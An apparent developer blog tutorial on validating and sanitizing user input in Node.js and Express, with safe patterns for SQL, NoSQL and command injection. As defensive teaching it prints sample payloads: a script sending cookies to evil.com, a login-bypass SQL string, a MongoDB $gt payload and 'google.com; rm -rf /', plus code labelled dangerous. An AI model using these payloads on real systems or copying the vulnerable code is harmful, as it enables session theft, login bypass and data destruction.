---
title: "Input Sanitization: Never Trust What Comes from the Browser"
date: "2026-04-17"
tags: ["backend", "sanitization", "validation", "security", "Node.js", "Express"]
excerpt: "Learn why validating and sanitizing user input is your first line of defense against injection attacks, broken data, and security nightmares."
---

# Input Sanitization: Never Trust What Comes from the Browser

Your user submits a form. What if they typed `<script>alert('hacked')</script>` instead of their name? What if they sent `age: -5`? What if the "email" field contains a SQL query? If your backend doesn't check, you're in trouble.

## What is Input Sanitization?

**Input sanitization** is the process of cleaning, validating, and transforming user input before using it — whether storing it in a database, displaying it on a page, or passing it to another system.

Two related but distinct concepts:

- **Validation:** Does the input meet the expected format? (Is the email actually an email? Is the age a positive number?)
- **Sanitization:** Is the input safe to use? (Remove HTML tags, escape special characters, trim whitespace.)

Think of it like airport security. Validation checks if you have a valid ticket. Sanitization checks your bags for dangerous items. Both happen before you board.

## Why Does It Matter?

❌ **Problem:** Your app accepts a username with no validation:

```text
POST /api/users
{ "username": "<script>document.location='https://evil.com?c='+document.cookie</script>" }
```

You save it directly to the database. Next time anyone views the user list, that script runs in their browser. Or worse:

```text
POST /api/login
{ "email": "admin@site.com' OR '1'='1", "password": "anything" }
```

If you concatenate that into a SQL query, the attacker just bypassed your login.

✅ **Solution:** Validate input meets expected rules and sanitize it to remove dangerous content — **on the server**, every time, no exceptions.

## Validation vs Sanitization

```text
Validation:
  - "Is this a valid email?" → YES or NO
  - "Is this age between 0 and 150?" → YES or NO
  - Rejects invalid input with error messages

Sanitization:
  - "Make this input safe to use"
  - Removes HTML tags, trims whitespace, escapes characters
  - Transforms input into a safe form
```

Both should happen. Validate first, then sanitize.

## How to Implement Input Validation

### Using Express Validator

```text
npm install express-validator
```

```text
const { body, validationResult } = require("express-validator");

app.post("/api/users",
  // Validation rules
  body("email")
    .isEmail()
    .normalizeEmail()
    .withMessage("Valid email required"),

  body("username")
    .trim()
    .isLength({ min: 3, max: 30 })
    .matches(/^[a-zA-Z0-9_]+$/)
    .withMessage("Username: 3-30 chars, alphanumeric + underscore only"),

  body("age")
    .isInt({ min: 0, max: 150 })
    .withMessage("Age must be between 0 and 150"),

  body("password")
    .isLength({ min: 8 })
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage("Password: min 8 chars, 1 uppercase, 1 lowercase, 1 number"),

  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    // Input is validated and sanitized — safe to use
    createUser(req.body);
  }
);
```

### Common Validation Rules

| Field | Validation | Example |
|---|---|---|
| Email | `.isEmail().normalizeEmail()` | `user@example.com` |
| Username | `.isAlphanumeric().isLength({min:3})` | `john_doe42` |
| Password | `.isStrongPassword()` | min 8, mixed case, numbers, symbols |
| Age | `.isInt({min:0, max:150})` | `25` |
| URL | `.isURL()` | `https://example.com` |
| Phone | `.isMobilePhone()` | `+1234567890` |
| Date | `.isISO8601()` | `2024-01-15` |
| MongoDB ID | `.isMongoId()` | `507f1f77bcf86cd799439011` |
| UUID | `.isUUID()` | `550e8400-e29b-41d4-a716-446655440000` |

### Manual Validation (Without Libraries)

```text
function validateUser(input) {
  const errors = [];

  if (!input.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input.email)) {
    errors.push("Valid email required");
  }

  if (!input.username || input.username.trim().length < 3) {
    errors.push("Username must be at least 3 characters");
  }

  if (!input.age || input.age < 0 || input.age > 150) {
    errors.push("Invalid age");
  }

  return errors;
}
```

## How to Sanitize Input

### String Sanitization

```text
// Trim whitespace
const name = userInput.trim();

// Escape HTML entities
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// Remove HTML tags entirely
const stripped = userInput.replace(/<[^>]*>/g, "");

// Allowlist specific HTML tags (for rich text)
const clean = sanitizeHtml(userInput, {
  allowedTags: ["b", "i", "em", "strong", "p", "a"],
  allowedAttributes: { "a": ["href"] }
});
```

### SQL Injection Prevention

❌ **Never concatenate user input into SQL queries:**

```text
// DANGEROUS — SQL injection possible
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
```

✅ **Always use parameterized queries:**

```text
// Safe — parameters are escaped automatically
// Using Prisma
const user = await prisma.user.findUnique({
  where: { email: req.body.email }
});

// Using parameterized SQL
const result = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [req.body.email]
);
```

### NoSQL Injection Prevention

MongoDB and similar databases have their own injection risks:

```text
// Dangerous — attacker sends { "password": { "$gt": "" } }
// This matches ALL documents!

// Safe — use validation and type checking
app.post("/login", (req, res) => {
  const { email, password } = req.body;

  // Ensure password is a string, not an object
  if (typeof password !== "string") {
    return res.status(400).json({ error: "Invalid input" });
  }

  // Use mongoose/mongodb queries with proper types
  User.findOne({ email: email, password: hashedPassword });
});
```

### Command Injection Prevention

User input passed to shell commands is extremely dangerous:

```text
// DANGEROUS — command injection
const { exec } = require("child_process");
exec(`ping ${req.body.host}`);
// Attacker sends: host = "google.com; rm -rf /"

// Safe — validate input against a allowlist
const allowedHosts = ["google.com", "github.com"];
const host = req.body.host;

if (!allowedHosts.includes(host)) {
  return res.status(400).json({ error: "Invalid host" });
}
```

## Sanitization for Different Contexts

Input needs different sanitization depending on **where** it's used:

```text
┌────────────────────────────────────────────────────────┐
│                   User Input                           │
│                   "O'Brien <script>alert(1)</script>"  │
└──────────┬──────────┬──────────┬──────────────────────┘
           │          │          │
     ┌─────▼─────┐ ┌──▼───────┐ ┌▼──────────────┐
     │  HTML     │ │  SQL     │ │  JavaScript   │
     │  Context  │ │  Context │ │  Context      │
     ├───────────┤ ├──────────┤ ├───────────────┤
     │ Escape:   │ │ Use      │ │ JSON encode   │
     │ &lt;script│ │ parame-  │ │ or avoid      │
     │ &gt;      │ │ terized  │ │ embedding     │
     │ &#x27;    │ │ queries  │ │ in scripts    │
     └───────────┘ └──────────┘ └───────────────┘
```

## Where to Validate

### ❌ Only on the Frontend

Frontend validation improves UX but is trivially bypassed. Anyone can open DevTools or use curl.

### ❌ Only on the Backend

Missing frontend validation means a poor user experience — errors only after a full round-trip.

### ✅ Both — With Backend as the Source of Truth

```text
Frontend: Validate for UX (instant feedback)
Backend:  Validate for security (the real enforcement)
```

**Always validate on the server.** Frontend validation is a bonus, not a replacement.

## Input Sanitization Checklist

| Input Type | Validation | Sanitization |
|---|---|---|
| Email | `.isEmail()` | `.normalizeEmail()` |
| String | `.isLength()`, regex | `.trim()`, escape HTML |
| Number | `.isInt()`, `.isFloat()` | `parseInt()`, `parseFloat()` |
| URL | `.isURL()` | Encode special chars |
| File upload | Check type, size, extension | Rename, store outside web root |
| JSON | Parse safely, check structure | Reject unexpected fields |
| Headers | Validate custom headers | Don't trust blindly |
| Query params | Validate and type-check | Treat like any user input |

## Key Points Cheat Sheet

| Concept | What It Does |
|---|---|
| **Validation** | Checks if input matches expected format |
| **Sanitization** | Cleans input to make it safe |
| **express-validator** | Go-to library for Express input validation |
| **Parameterized queries** | Prevents SQL injection — never concatenate |
| **HTML escaping** | Prevents XSS — encode special characters |
| **Allowlist approach** | Define what's allowed, not what's banned |
| **Server-side enforcement** | Backend validation is the real security layer |
| **Type checking** | Prevents NoSQL injection — ensure correct types |
| **Command injection** | Never pass user input to shell commands |
| **Defense in depth** | Validate on frontend + backend |

**Every piece of data from the browser is an attack vector until you prove otherwise.**
